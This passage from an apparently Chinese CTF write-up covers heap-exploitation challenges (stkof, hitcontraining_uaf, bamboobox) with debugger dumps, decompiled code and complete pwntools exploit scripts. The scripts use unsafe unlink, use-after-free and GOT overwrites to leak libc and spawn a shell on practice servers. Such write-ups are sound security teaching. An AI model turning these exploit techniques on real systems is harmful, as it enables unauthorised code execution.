<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">0x1561000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 4113, </span><br><span class="line">  fd = 0xa33, </span><br><span class="line">  bk = 0x20, </span><br><span class="line">  fd_nextsize = 0x602138, </span><br><span class="line">  bk_nextsize = 0x602140</span><br><span class="line">&#125;</span><br><span class="line">0x1562010 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 273, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x1562120 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1041, </span><br><span class="line">  fd = 0xa4b4f, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x1562530 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 65, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x20ac1, </span><br><span class="line">  fd_nextsize = 0x602138, </span><br><span class="line">  bk_nextsize = 0x602140</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/32gx 0x1561000</span><br><span class="line">0x1561000:	0x0000000000000000	0x0000000000001011</span><br><span class="line">0x1561010:	0x0000000000000a33	0x0000000000000020</span><br><span class="line">			fake fd			    fake bk</span><br><span class="line">0x1561020:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x1561030:	0x0000000000000020	0x6161616161616161</span><br><span class="line">0x1561040:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x1561050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1561060:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h3 id="4exp-12"><a class="markdownIt-Anchor" href="#4exp-12"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/joe1sn/libc/64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;25342&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x100</span>)        <span class="comment"># idx 1</span></span><br><span class="line">    alloc(<span class="number">0x30</span>)         <span class="comment"># idx 2</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)         <span class="comment"># idx 3</span></span><br><span class="line">    </span><br><span class="line">    head = <span class="number">0x602140</span>		    <span class="comment">#global pointer</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)        <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)    <span class="comment">#size --&gt; except the first line, the rest two line is equal to 0x20?</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)   <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)   <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)    <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)        <span class="comment">#0x30 is the front one whole size?</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2]) - 0x18 = head - 8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="hitcontraining_uaf"><a class="markdownIt-Anchor" href="#hitcontraining_uaf"></a> hitcontraining_uaf</h2>
<p><strong>Use_After_Free</strong></p>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<p><strong>得到几个选项+后门</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,text</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<p><strong>backdoor:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/hacknote/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>free：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*((<span class="type">void</span> **)notelist[v1] + <span class="number">1</span>));</span><br><span class="line">   <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里free后指针未清造成UAF</p>
</blockquote>
<ul>
<li><strong>EXP</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    magic = <span class="number">0x08048986</span></span><br><span class="line">    system = <span class="number">0x8048506</span></span><br><span class="line">    addnote(<span class="number">32</span>,<span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">    addnote(<span class="number">32</span>,<span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">    addnote(<span class="number">32</span>,<span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">    delnote(<span class="number">0</span>)</span><br><span class="line">    delnote(<span class="number">1</span>)</span><br><span class="line">    addnote(<span class="number">8</span>,p32(magic))</span><br><span class="line">    printnote(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="hitcontraining_bamboobox"><a class="markdownIt-Anchor" href="#hitcontraining_bamboobox"></a> hitcontraining_bamboobox</h2>
<p><strong>Unlink or House_Of_Force</strong></p>
<ul>
<li><strong>checksec</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>IDA</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>back_door</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/home/bamboobox/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>change_item</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>, &amp;buf);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">8uLL</span>);</span><br><span class="line">  v0 = atoi(&amp;nptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>, &amp;nptr);</span><br><span class="line">  *(_BYTE *)(qword_6020C8[<span class="number">2</span> * v2] + (<span class="type">signed</span> <span class="type">int</span>)read(<span class="number">0</span>, (<span class="type">void</span> *)qword_6020C8[<span class="number">2</span> * v2], v0)) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>堆溢出</p>
</blockquote>
<blockquote>
<p>**1.unsafe unlink: **对进行 unlink chunk 进行内存布然后借助 unlink 操作来达成修改指针的效果。个人认为通过堆溢出伪造一个chun伪造的chunk一般在fd和bk上不同</p>
<p>**2.house of force: **</p>
<blockquote>
<p>进行堆分配如果所有空闲的块都无法满足需那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案可以使得 top chunk指向我们期望的任何位这就相当于一次任意地址写。   --CTFWiKi</p>
</blockquote>
<blockquote>
<p>需要以下条件：</p>
<ol>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
</blockquote>
</blockquote>
<ul>
<li><strong>EXP-1</strong></li>
</ul>
<p><strong>unlink</strong></p>
<blockquote>
<p>原版EXP方便理解所以直接拿来用了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;training.pwnable.tw&quot;</span></span><br><span class="line">port = <span class="number">11011</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">additem</span>(<span class="params">length,name</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">additem(<span class="number">0x40</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">additem(<span class="number">0x80</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">additem(<span class="number">0x40</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) <span class="comment">#prev_size</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x41</span>) <span class="comment">#size</span></span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x18</span>) <span class="comment">#fd</span></span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x10</span>) <span class="comment">#bk</span></span><br><span class="line">fake_chunk += <span class="string">&quot;c&quot;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>)<span class="comment">#修复</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>)<span class="comment">#修复</span></span><br><span class="line"></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x80</span>,fake_chunk) <span class="comment">#unlink</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0x602068</span>)</span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">show()		<span class="comment">#libc base leak</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;0 : &quot;</span>)</span><br><span class="line">atoi = u64(r.recvuntil(<span class="string">&quot;:&quot;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc = atoi - <span class="number">0x36e80</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc:&quot;</span>,<span class="built_in">hex</span>(libc)</span><br><span class="line">system = libc + <span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;sh&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里可以看见我们伪造的堆结构:</p>
